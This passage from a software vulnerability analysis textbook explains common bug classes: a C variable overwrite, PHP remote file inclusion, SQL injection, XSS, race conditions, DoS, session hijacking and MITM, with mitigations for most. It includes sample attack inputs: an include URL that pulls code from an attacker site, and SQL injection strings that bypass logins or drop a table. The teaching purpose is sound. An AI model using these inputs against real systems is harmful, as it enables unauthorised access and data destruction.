}
else
strncpy(buf, s, strlen(s) );
if (logged_in == 0x41414141)
printf(“hi -- you should never see this, because logged_in is
never set by program code.\r\n”); }
int main(int argc, char * argv[])
{
un_init(argv[1]);
}
# ./uninitialized aaaaaaaaaaaaaaaaaaaaaaaaaaaaaabbCCCCDDDD
String too long!
# ./uninitialized aaaaaaaaaaaaaaaaaaaaaaaaaaaaaabbCCCC
# ./uninitialized aaaaaaaaaaaaaaaaaaaaaaaaaaaaaabbAAAA
hi -- you should never see this, because logged_in is never set by
program code.
Note there is an integer in the program that is never initialized to a value. In
this example, since a straight overwrite occurs, it is irrelevant that it is uninitialized,
but in some cases that is key. In this simple case, if just the right string is sent, the
internal operation of the program can be alerted in ways not intended. Whether
variable overwrites are exploitable is always application-dependent and requires a
heavy amount of reverse engineering and code flow analysis.
2.4.1.7 Other Memory Overwrites
As we have seen from stack, heap, and variable overflows, any time an attacker can
modify the internal memory of an application in unintended ways, bad things can
happen, including the attacker’s gaining complete control of the system. Thus, we
should not be surprised to learn that if data in other parts of the program can be
modified, an attack might also succeed. Overwriting function pointers is another
attacker favorite. Also, credential information stored in the BSS or data segment
6760 Book.indb 51 12/22/17 10:50 AM
52 Software Vulnerability Analysis
could be interesting to read from (think format string bug) or write to. The point is
if arbitrary memory read or writes are possible, unintended consequences may result.
2.4.2 Web Applications
The internet has been growing exponentially since its inception. With 7.3 million
pages being added each day,14 it is safe to assume a secure future for those auditing
Web applications for security. We will examine some common Web bugs. Note that
these types of problems are not unique to the Web. For example, VoIP systems are
known to have all the same types of flaws, as can any other system that will pass
user-provided data forward to a script, database, or any other system.
2.4.2.1 PHP File Inclusions
PHP is one of the many programming languages used to create interactive Web
pages. A remote file inclusion (RFI) is an attack that sometimes allows an attacker
to run his own code on a website. Register_globals is ON by default in PHP ver-
sions previous to 4.2.0. When the register_globals parameter is ON, all the EGPCS
(Environment, GET, POST, Cookie, and Server) variables are automatically regis-
tered as global variables. This allows attackers to define a variable by simply editing
a URL. For example, consider the following vulnerable line of PHP:
include($mypage . ‘/specialfile.php’);
Links from this application may appear as follows:
www.nicecompany.com/index.php?mypage=localfiles
But, because the $mypage variable isn’t specially defined, the URL could be
manually edited to this:
www.nicecompany.com/index.php?mypage=http://www.evilsite.com/
The include function instructs the server to retrieve the remote file and run
its code. If this server is running a vulnerable version of PHP, the attacker would
now have a webshell, sometimes referred to as a c99 shell (all without any type of
buffer overflow, shellcode, etc.). The c99 allows the attacker to view and edit files
as well as possibly elevate privileges. Again, newer versions of PHP have corrected
this error by setting the register_globals to OFF (although some administrators will
turn this back on because older applications may require it). Other measures such
as clearly defining all variables and safer URL parsing should also be implemented.
Another important configuration parameter is the open_basedir parameter, which
should be set to the base directory where the main site file (index.php in this case) is
located. This prevents attackers from reading in any local file from the Web server
14 www2.sims.berkeley.edu/research/projects/how-much-info/internet.html.
6760 Book.indb 52 12/22/17 10:50 AM
2.4 Basic Bug Categories 53
by restricting access to the preconfigured directory. This is especially important in
a shared hosting environment.
2.4.2.2 SQL Injections
Many applications, especially Web applications, use a structured query language
(SQL) database backend to process user requests. For e-commerce sites, this is nec-
essary to receive customer billing information and retrieve customer requests about
offered products. If proper input validation is not preformed, a malicious attacker
could craft special SQL queries to either retrieve information it should not have
access to, force authentication statements to be true, or to inject SQL commands
(such as adding a user) that it should not be able to run. In some situations, attack-
ers may even be able to read files or run arbitrary code on the system. The single-
quote character is of particular interest because it tells the SQL system to escape
the currently executing command and run a new one. Supposed the following line
of SQL is used to process a username:
statement := “SELECT * FROM users WHERE name = ‘” + username + “’;”
If, for the username, an attacker inputs:
b’ or ‘c’=’c
The effective SQL command would be
SELECT * FROM users WHERE name = ‘b’ or ‘c’=’c’;
Then this query would return data that could have the effect of bypassing
authentication and allowing an attacker to log in, since the conditional clause is
always true as c always equals c. If the attacker were to input
b’;DROP TABLE users; SELECT * FROM data WHERE name LIKE ‘%
the user table would be deleted and information from the data table would be retrieved.
A newer variation on this technique is called blind SQL injection. During a blind
SQL injection, the attacker is looking at a perfectly valid page that continues to be
displayed, whereas in typical SQL injection attack, the attacker is looking for error
messages to help further the attack. In a blind SQL injection, one can test a page by
verifying what a noninjected page looks like, let’s say a set of hockey scores, then
the attacker begins inserting values into the request much like a traditional SQL
injection. A properly crafted application will deny the extra characters and return
a “404 not found” or a generic error page. If the attacker still receives the set of
hockey scores, even with the injection, then the application may be vulnerable. This
type of vulnerability is useful for determining database and table names, enumerat-
ing passwords, and gathering other information that can be used as stepping-stones
to later attacks.
6760 Book.indb 53 12/22/17 10:50 AM
54 Software Vulnerability Analysis
2.4.2.3 XPath, XQuery, and Other Injection Attacks
Metacharacter injection, like the single tick used in SQL injection, is actually part
of a generic vulnerability class that occurs whenever one language is embedded in
another. SQL, Shell, XML, HTML, LDAP search filters, XPath, XQuery HDL,
JDOQL, EJBQL, OQL, for example, are some of the areas where injection issues
have been located.
There appears to be no universal fix for this bug class. If programmers prop-
erly escaped user input, most of these attacks would disappear, but if programmers
wrote perfect code, there would be no security bugs. As always, standard defense-
in-depth strategies, such as limiting the application’s privileges, should be employed.
In some cases, like SQL, there may be functions that provide relief. For example,
if SQL prepared statements are used, metacharacter injections are not possible. In
PHP, the mysql_real_escape_string(), is available to help filter potentially dangerous
input characters. Static or runtime analysis tools can also be used to scan particular
language bases for injection weaknesses.
2.4.2.4 Cross-Site Scripting
Cross-site scripting (XSS) is a common method for malicious Web users to abuse
the rights of other Web users of a particular site. In the typical scenario, two con-
ditions must be met: First, an attacker must determine a page on the website of
interest that contains a XSS vulnerability. That means the site must accept input
and then attempt to display it without filtering for HTML tags and/or (Java/other)-
script code. Second, the attacker must select a victim, desired data, mechanism of
coercion, and mechanism of retrieval. The desired data might be the victim’s login
cookie, and the method of coercion might be a spoofed e-mail from the site’s admin.
The collection mechanism might be a bogus website designed to collect such data.
Once this is all ready, the attacker sends the victim the e-mail with the XSS link.
If the victim clicks on the link, the attacker will now have a cookie since the script
code, say JavaScript, will be executed in the victim’s Web browser. This code may
send the contents of the victim’s cookies (including session IDs) to the attacker. Such
attacks could be automated to phish the masses on the vulnerable site.
There are two main types of XSS vulnerabilities, reflected and stored. The
scenario described above is of the reflected variety. Reflected XSS vulnerabilities
dynamically execute scripting language code included with a request. In the above
case, the code to send the victim’s login cookie would have been included in the
particular link sent to the victim. It is called reflected because the malicious code is
sent by the victim by following the link to the vulnerable server, which then reflects
it back to the victim’s browser for execution. This code then runs in the context of
the trusted site. The other type of attack is called a stored XSS vulnerability. In this
case, the vulnerable Web application is designed in such a way that the user input is
permanently stored on the server and displayed (and executed) by any viewer to that
page. Examples might be Web forums or blog comments. This type is particularly
nasty since any visitor to the site can be compromised.
Defeating XSS attacks is similar to defending against other types of code injec-
tion. The input must be sanitized. User input containing HTTP code needs to be
6760 Book.indb 54 12/22/17 10:50 AM
2.4 Basic Bug Categories 55
escaped or encoded so that it will not execute. Additional, systemwide measures
such as Content Security Policy may be set as well to eliminate XSS attacks.
2.4.3 Brute Force Login
Brute force simply means trying something over and over again until a desired con-
dition occurs. On systems that have no limit on attempted logins, user/password
combinations can be continually tried until a success is found. This is true of more
than just logins. Credential cookies on webpages and URL guessing to view files,
for example, can be used. Brute force attacks can also target usernames or phone
numbers with common passwords and pins, by enumerating through all possible
voice mail numbers with simple pins like “0000” or “2580,” as someone is bound
to use those. Enforcing strong passwords, monitoring logs, and limiting access
attempts from similar IPs can be an effective way to mitigate such attacks. Note:
If automatic blocking (blacklisting) is present, the system may be vulnerable to a
denial of service attack. In this scenario, an attacker purposely fails to log in as the
victim many times. When the system locks the victim’s account, the victim can no
longer access his or her own legitimate account.
2.4.4 race Condition
Race conditions are vulnerabilities that arise due to unforeseen timing events. A
standard example can be seen from the following code excerpt from an application
running at higher privileges.
if(!access(tempfilename, W_OK)){
fp = fopen(tempfilename, “a+”);
fwrite(user_supplied_info, 1, strlen(user_supplied_info), fp);
fclose(fp);
} else {
error(“User does not have write permission to temp file\n”;
}
Suppose this application is SETUID root (i.e., running at a higher privilege
level than the user who is using it). In this code, a temporary file is first checked
to make sure the user has permission to write to it. If so, it appends some user-
supplied data to the file. The problem here is the small amount of time that occurs
between the permission check in the access() call and the use of the file in the
fopen() call. This is sometimes called a time-of-check-to-time-of-use bug. During
that small window, the user can create a symbolic link from the temporary file to
a file he or she should not have access to, such as /etc/passwd. If timed just right,
this will allow an attacker to append arbitrary data to this file and thus add a
login account with super user privileges. This example shows that race conditions
can be particularly difficult to exploit, but with a little patience and the fact the
attacker can overload the system by fully utilizing system resources, attacks of
this nature are possible.
6760 Book.indb 55 12/22/17 10:50 AM
56 Software Vulnerability Analysis
2.4.5 Denial of Service
A denial of service (DoS) or distributed denial of service (DDoS) is the act of over-
whelming a system, service, or device to the point at which it can no longer service
legitimate requests. An early DoS attack was the SYN flood, in which an attacker
could take advantage of the inherent weakness of the TCP/IP stack by sending the
first portion of the TCP handshake, the SYN packet, but never sending acknowledg-
ments when the remote host responded. This could cause huge resource consump-
tion, socket limit errors, or CPU utilization if many of these requests were sent at
once. Now, these attacks can be lessened by firewall rules and settings inside vari-
ous operating systems.
At the application layer, denial of service attacks are also possible. The most
obvious example would be a network server that doesn’t spawn new connections
for each client attempt and also has a buffer overflow. If the attacker triggers the
overflow in a nonexploitable way, the likely result is application failure (crash) and
thus a DoS.
Also, if an attacker can find a scenario in which the application does a lot of
work while the attacker does only a little, this could result in a DoS. Imagine an
application that performs some complex cryptographic function or database lookup
in response to an attacker’s simple query. The attacker can generate many of these
simple queries very quickly while the application must perform an intensive action
each time. The result is that the application could become so overwhelmed that it
will not be able to perform well, if at all, for legitimate clients.
2.4.6 Session hijacking
Session hijacking is the means of stealing a (often previously authenticated) session
from a remote user and gaining access to the system or service at that privilege level.
A common example of a session hijack is when a user has logged into a website
that stores credentials in a cookie, and an attacker is able to retrieve that cookie
and use it to bypass the authentication of the site the victim had recently visited. A
good countermeasure to session hijacking is the use of a time-based authentication
mechanism (a good base is Kerberos) combined with some cryptographic hash or
algorithm and an expiry time for an authenticated session.
2.4.7 Man in the Middle
A man in the middle (MITM) attack is one in which an attacker is able to sit between
a client and a server and read or inject information into the data stream that is going
to either side of the connection. There are prepackaged tools like ettercap that will
enable one to easily execute a MITM attack on a local LAN by using a technique
called ARP poisoning. This technique convinces the victim’s computer that the
attacking system is its default gateway and the gateway believes that the attacker
is the victim host. The attacker is then able to sniff (watch) all of the passing traf-
fic, and change any of the information in between. Again, strong encryption can
help to mitigate this risk, but it is always a major concern, especially in large or
public networks.
6760 Book.indb 56 12/22/17 10:50 AM
2.5 Bug Hunting Techniques 57
2.4.8 Cryptographic Attacks
Cryptographic attacks are a way for an attacker to bypass an encryption or cryp-
tographic system by attacking weaknesses in the algorithm that employs it. There
are numerous methods for cryptanalysis that are far beyond the scope of this book,
but in recent years cryptographic attacks are becoming more prevalent as more and
more commercial products are relying on cryptography to protect their systems
and software.
2.5 Bug hunting Techniques
Now that we know the types of vulnerabilities that exist, it is time to talk about
how to find them, which is what this book is all about. Traditionally, a hacker was
simply a technically inclined person who took a deep interest in the technology by
which he or she was surrounded. This led to incidents in which the individual had
the ability to make free long distance phone calls, bypass biometric authentica-
tions, or misuse RFID, which ultimately led the term to carry strong connotations
of misadventure or wrong doing.
While some mystery still surrounds the secret lives of hackers, most that are
involved in software vulnerability analysis operate in one of a few high-level man-
ners: reverse engineering, source code auditing, fuzzing, or acquiring/extending
borrowed, purchased, or stolen bugs. Since only the first three strongly relate to
this book, we will ignore the vast and varied channels by which bugs or exploits
are sold and resold.
Once a bug has been identified, the process of creating an exploit begins. A next
and equally involved step is the usage or deployment of such exploits, sometimes
called information operations. These topics are also beyond the scope of this book.
2.5.1 reverse Engineering
Reversing engineering15 (RE or RE’ing) the internal design of a closed system,
software, or hardware package is a very useful skill that has both legitimate and
illegitimate uses. Like so many skills, the reverse engineer could be working for one
of many reasons, but as you’d expect we’re concerned with how RE could be used
to find bugs in software. The objective is clear: Turn compiled binary code back
into its high-level representation to understand the product, so that implementation
errors can be sought out. The process for doing this is nontrivial and potentially
time consuming. Traditionally, it was done by hand: Begin by using a disassembler
to retrieve a mapping from the binary op or byte codes, to the assembly language
instructions. Next, manually determine the purpose of a block of assembly instruc-
tions. Iterate until enough understanding has been gained to achieve the given task.
This process still largely involves manual inspection, but tools such as IDApro16
and Bindiff17 exist to accelerate the task.
15 www.openrce.org/articles is a good place to find more information about reverse engineering.
16 For further information on IDA, check out https://www.hex-rays.com/products/ida/.
17 For more information on Bindiff, see http://www.zynamics.com/bindiff.html.
6760 Book.indb 57 12/22/17 10:50 AM
58 Software Vulnerability Analysis
The following is a disassembled function, as shown in IDApro:
var_28= dword ptr -28h
var_24= dword ptr -24h
var_20= dword ptr -20h
var_1C= dword ptr -1Ch